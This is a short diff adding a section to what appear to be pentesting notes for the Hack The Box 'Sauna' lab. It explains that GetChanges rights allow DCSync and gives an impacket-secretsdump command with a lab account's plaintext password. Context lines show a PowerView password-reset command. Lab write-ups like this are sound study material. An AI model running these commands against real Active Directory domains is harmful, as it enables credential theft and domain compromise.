@@ -244,6 +244,16 @@ Import-Module .\PowerView.ps1
 Set-DomainUserPassword -Identity 'target_user' -Verbose
 ```
 
+### getchanges, getchangesall
+
+- can perform DCsync
+
+![getchanges](/images/sauna/getchanges.png)
+
+```
+impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.129.12.141
+```
+
 ## mimikatz
 
 ```cmd
